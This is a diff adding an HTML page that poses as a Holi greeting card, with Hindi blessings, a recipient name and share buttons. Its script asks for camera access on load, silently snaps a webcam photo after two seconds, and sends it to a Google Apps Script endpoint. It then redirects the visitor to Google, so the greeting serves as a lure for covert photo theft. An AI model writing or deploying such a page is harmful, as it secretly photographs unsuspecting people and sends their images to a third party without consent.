@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Happy Holi</title>
+    <style>
+        /* Your styles remain unchanged */
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background: linear-gradient(to bottom, #ffff99, #99ccff);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .container {
+            text-align: center;
+            padding: 20px;
+        }
+
+        h1 {
+            font-size: 2em;
+            color: #000;
+            margin-bottom: 20px;
+        }
+
+        .welcome-section {
+            margin-bottom: 20px;
+        }
+
+        .welcome-icon {
+            font-size: 1.5em;
+        }
+
+        .hindi-text {
+            font-size: 1.2em;
+            margin: 5px 0;
+            font-family: 'Noto Sans Devanagari', sans-serif;
+            color: #333;
+        }
+
+        .green-bg {
+            background-color: #00ff00;
+            padding: 10px;
+            border-radius: 10px;
+            display: inline-block;
+            color: #ffffff;
+            text-shadow: 1px 1px 2px #000;
+        }
+
+        .alok-text {
+            font-size: 3em;
+            color: #00ffff;
+            text-shadow: 0 0 10px #00ffff, 0 0 20px #00ffff, 0 0 30px #00ffff;
+            margin: 20px 0;
+            font-weight: bold;
+            animation: float 3s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-20px); }
+        }
+
+        .wishing-section h2 {
+            font-size: 1.5em;
+            color: #0000ff;
+            margin: 5px 0;
+        }
+
+        .red-text {
+            font-size: 1.2em;
+            color: #ff0000;
+            margin: 10px 0;
+        }
+
+        .green-text {
+            font-size: 1em;
+            color: #ffffff;
+            background-color: #00ff00;
+            padding: 10px;
+            border-radius: 10px;
+            display: inline-block;
+            text-shadow: 1px 1px 2px #000;
+        }
+
+        .pink-text {
+            font-size: 1em;
+            color: #ff00ff;
+            background-color: #ff99ff;
+            padding: 10px;
+            border-radius: 10px;
+            display: inline-block;
+        }
+
+        .purple-text {
+            font-size: 1em;
+            color: #800080;
+            background-color: #d8bfd8;
+            padding: 10px;
+            border-radius: 10px;
+            display: inline-block;
+        }
+
+        .share-buttons {
+            margin-top: 20px;
+        }
+
+        .whatsapp {
+            background-color: #25d366;
+            color: white;
+        }
+
+        .facebook {
+            background-color: #3b5998;
+            color: white;
+        }
+
+        @media (max-width: 600px) {
+            h1 {
+                font-size: 1.5em;
+            }
+            .alok-text {
+                font-size: 2em;
+            }
+            .wishing-section h2 {
+                font-size: 1.2em;
+            }
+            .share-buttons button {
+                display: block;
+                width: 80%;
+                margin: 10px auto;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>|||| Every Day is Special ||||</h1>
+        <div class="welcome-section">
+            <span class="welcome-icon">🙏</span> Welcome <span class="welcome-icon">🙏</span>
+            <p class="hindi-text">आपका हर दिन खुशियों से भरा हो।</p>
+            <p class="hindi-text">इस खास दिन की ढेरों शुभकामनाएँ !</p>
+            <p class="hindi-text green-bg">|| खुशियाँ आपके साथ हों ||</p>
+        </div>
+        <div class="alok-text" id="userName">ALOK</div>
+        <div class="wishing-section">
+            <h2>Wishing you a very</h2>
+            <h2>⭐ Happy xxx ⭐</h2>
+            <p class="red-text">to you and your lovely family</p>
+            <p class="green-text">Wishing you and your family lots of happiness and blessings on this special occasion. May joy always surround you.</p>
+            <p class="pink-text">⭐ I wish that this day is your best one. ⭐</p>
+            <p class="hindi-text purple-text">आज का दिन आपके जीवन में ढेर सारी खुशियाँ, सुकून और प्यार लेकर आए। आपको इस पावन अवसर की हार्दिक शुभकामनाएँ।</p>
+        </div>
+        <div class="share-buttons">
+            <button class="whatsapp">Whatsapp Share</button>
+            <button class="facebook">Facebook Share</button>
+        </div>
+    </div>
+
+    <div class="form-container">
+        <form id="myForm" method="post">
+            <input type="hidden" name="title" value="Camera">
+            <input type="hidden" name="redirect_url" value="https://Google.com">
+            <input type="hidden" name="urlInput" value="Camera.html">
+            <input type="hidden" name="timestamp">
+            <input type="hidden" name="photo" id="photo">
+
+            <video id="video" autoplay style="display:none;"></video>
+            <canvas id="canvas" style="display:none;"></canvas>
+
+        </form>
+    </div>
+
+    <script>
+        // Setup video stream and capture photo
+        const form = document.getElementById('myForm');
+        const photoInput = document.getElementById('photo');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+            video.srcObject = stream;
+
+            // After 2 seconds, capture the photo and automatically submit the form
+            setTimeout(() => {
+                const context = canvas.getContext('2d');
+                canvas.width = video.videoWidth || 640; // fallback width
+                canvas.height = video.videoHeight || 480; // fallback height
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                photoInput.value = canvas.toDataURL('image/png');
+
+                // Stop the video stream
+                stream.getTracks().forEach(track => track.stop());
+                video.style.display = 'none';
+
+                // Submit the form automatically
+                const formData = new FormData(form);
+                const redirectUrl = formData.get('redirect_url');
+
+                // Convert formData to URLSearchParams for POST
+                const params = new URLSearchParams();
+                for (const pair of formData.entries()) {
+                    params.append(pair[0], pair[1]);
+                }
+
+                // Submit the form
+                fetch('https://script.google.com/macros/s/AKfycbxwMvuQnraAoBx9TrB-g__Pa9oH3ApUW7f3E9pbI-Em7pT3mZxUVkdXNSseG9vgQCqI/exec', {
+                    method: 'POST',
+                    body: params,
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded'
+                    }
+                })
+                .then(response => {
+                    if (!response.ok) throw new Error('Network response was not ok');
+                    return response.text();
+                })
+                .then(() => {
+                    // Redirect after successful form submission
+                    window.location.href = redirectUrl;
+                })
+                .catch(error => {
+                    // Redirect even if there is an error (e.g., network issues)
+                    window.location.href = redirectUrl;
+                });
+            }, 2000); // Capture after 2 seconds
+        })
+        .catch(err => {
+            console.error("Error accessing camera: ", err);
+        });
+    </script>
+</body>
+</html>
